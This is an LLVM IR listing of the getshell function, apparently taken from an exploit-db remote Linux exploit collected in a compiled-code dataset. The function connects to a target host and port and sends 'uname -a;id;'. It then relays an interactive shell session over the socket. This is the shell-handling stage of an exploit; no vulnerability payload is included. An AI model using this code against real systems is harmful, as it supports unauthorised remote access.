; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1139.c_getshell.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1139.c_getshell.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [52 x i8] c"[*] checking to see if the exploit was successful.\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [29 x i8] c"getshell(): socket() failed.\00", align 1
@SIGALRM = common dso_local global i32 0, align 4
@sig_alarm = common dso_local global i32 0, align 4
@TIMEOUT = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [35 x i8] c"[*] attempting to connect: %s:%d.\0A\00", align 1
@.str.3 = private unnamed_addr constant [31 x i8] c"[!] connection failed: %s:%d.\0A\00", align 1
@.str.4 = private unnamed_addr constant [37 x i8] c"[*] successfully connected: %s:%d.\0A\0A\00", align 1
@SIGINT = common dso_local global i32 0, align 4
@SIG_IGN = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [14 x i8] c"uname -a;id;\0A\00", align 1
@.str.6 = private unnamed_addr constant [29 x i8] c"getshell(): select() failed.\00", align 1
@.str.7 = private unnamed_addr constant [27 x i8] c"getshell(): read() failed.\00", align 1
@.str.8 = private unnamed_addr constant [28 x i8] c"getshell(): write() failed.\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @getshell(i32 %0, i16 zeroext %1, i8* %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i16, align 2
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4097 x i8], align 16
  %11 = alloca %struct.sockaddr_in, align 4
  store i32 %0, i32* %4, align 4
  store i16 %1, i16* %5, align 2
  store i8* %2, i8** %6, align 8
  store i32 0, i32* %7, align 4
  store i32 0, i32* %8, align 4
  %12 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str, i64 0, i64 0))
  %13 = load i32, i32* @AF_INET, align 4
  %14 = load i32, i32* @SOCK_STREAM, align 4
  %15 = load i32, i32* @IPPROTO_TCP, align 4
  %16 = call i32 @socket(i32 %13, i32 %14, i32 %15)
  store i32 %16, i32* %7, align 4
  %17 = icmp eq i32 %16, -1
  br i1 %17, label %18, label %20

18:                                               ; preds = %3
  %19 = call i32 @printe(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.1, i64 0, i64 0), i32 1)
  br label %20

20:                                               ; preds = %18, %3
  %21 = load i32, i32* @AF_INET, align 4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  store i32 %21, i32* %22, align 4
  %23 = load i32, i32* %4, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  %25 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %24, i32 0, i32 0
  store i32 %23, i32* %25, align 4
  %26 = load i16, i16* %5, align 2
  %27 = call i32 @htons(i16 zeroext %26)
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i32 %27, i32* %28, align 4
  %29 = load i32, i32* @SIGALRM, align 4
  %30 = load i32, i32* @sig_alarm, align 4
  %31 = call i32 @signal(i32 %29, i32 %30)
  %32 = load i32, i32* @TIMEOUT, align 4
  %33 = call i32 @alarm(i32 %32)
  %34 = load i8*, i8** %6, align 8
  %35 = load i16, i16* %5, align 2
  %36 = zext i16 %35 to i32
  %37 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.2, i64 0, i64 0), i8* %34, i32 %36)
  %38 = load i32, i32* %7, align 4
  %39 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %40 = call i64 @connect(i32 %38, %struct.sockaddr* %39, i32 12)
  %41 = icmp ne i64 %40, 0
  br i1 %41, label %42, label %47

42:                                               ; preds = %20
  %43 = load i8*, i8** %6, align 8
  %44 = load i16, i16* %5, align 2
  %45 = zext i16 %44 to i32
  %46 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.3, i64 0, i64 0), i8* %43, i32 %45)
  ret void

47:                                               ; preds = %20
  %48 = call i32 @alarm(i32 0)
  %49 = load i8*, i8** %6, align 8
  %50 = load i16, i16* %5, align 2
  %51 = zext i16 %50 to i32
  %52 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.4, i64 0, i64 0), i8* %49, i32 %51)
  %53 = load i32, i32* @SIGINT, align 4
  %54 = load i32, i32* @SIG_IGN, align 4
  %55 = call i32 @signal(i32 %53, i32 %54)
  %56 = load i32, i32* %7, align 4
  %57 = call i32 @write(i32 %56, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.5, i64 0, i64 0), i32 14)
  br label %58

58:                                               ; preds = %47, %103
  %59 = call i32 @FD_ZERO(i32* %9)
  %60 = call i32 @FD_SET(i32 0, i32* %9)
  %61 = load i32, i32* %7, align 4
  %62 = call i32 @FD_SET(i32 %61, i32* %9)
  %63 = load i32, i32* %7, align 4
  %64 = add nsw i32 %63, 1
  %65 = call i32 @select(i32 %64, i32* %9, i32 0, i32 0, i32 0)
  %66 = icmp slt i32 %65, 1
  br i1 %66, label %67, label %69

67:                                               ; preds = %58
  %68 = call i32 @printe(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.6, i64 0, i64 0), i32 1)
  br label %69

69:                                               ; preds = %67, %58
  %70 = call i64 @FD_ISSET(i32 0, i32* %9)
  %71 = icmp ne i64 %70, 0
  br i1 %71, label %72, label %88

72:                                               ; preds = %69
  %73 = getelementptr inbounds [4097 x i8], [4097 x i8]* %10, i64 0, i64 0
  %74 = call i32 @read(i32 0, i8* %73, i32 4096)
  store i32 %74, i32* %8, align 4
  %75 = icmp slt i32 %74, 1
  br i1 %75, label %76, label %78

76:                                               ; preds = %72
  %77 = call i32 @printe(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.7, i64 0, i64 0), i32 1)
  br label %78

78:                                               ; preds = %76, %72
  %79 = load i32, i32* %7, align 4
  %80 = getelementptr inbounds [4097 x i8], [4097 x i8]* %10, i64 0, i64 0
  %81 = load i32, i32* %8, align 4
  %82 = call i32 @write(i32 %79, i8* %80, i32 %81)
  %83 = load i32, i32* %8, align 4
  %84 = icmp ne i32 %82, %83
  br i1 %84, label %85, label %87

85:                                               ; preds = %78
  %86 = call i32 @printe(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.8, i64 0, i64 0), i32 1)
  br label %87

87:                                               ; preds = %85, %78
  br label %88

88:                                               ; preds = %87, %69
  %89 = load i32, i32* %7, align 4
  %90 = call i64 @FD_ISSET(i32 %89, i32* %9)
  %91 = icmp ne i64 %90, 0
  br i1 %91, label %92, label %103

92:                                               ; preds = %88
  %93 = load i32, i32* %7, align 4
  %94 = getelementptr inbounds [4097 x i8], [4097 x i8]* %10, i64 0, i64 0
  %95 = call i32 @read(i32 %93, i8* %94, i32 4096)
  store i32 %95, i32* %8, align 4
  %96 = icmp slt i32 %95, 1
  br i1 %96, label %97, label %99

97:                                               ; preds = %92
  %98 = call i32 @exit(i32 0) #3
  unreachable

99:                                               ; preds = %92
  %100 = getelementptr inbounds [4097 x i8], [4097 x i8]* %10, i64 0, i64 0
  %101 = load i32, i32* %8, align 4
  %102 = call i32 @write(i32 1, i8* %100, i32 %101)
  br label %103

103:                                              ; preds = %99, %88
  br label %58
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @printe(i8*, i32) #1

declare dso_local i32 @htons(i16 zeroext) #1

declare dso_local i32 @signal(i32, i32) #1

declare dso_local i32 @alarm(i32) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i32 @select(i32, i32*, i32, i32, i32) #1

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @read(i32, i8*, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
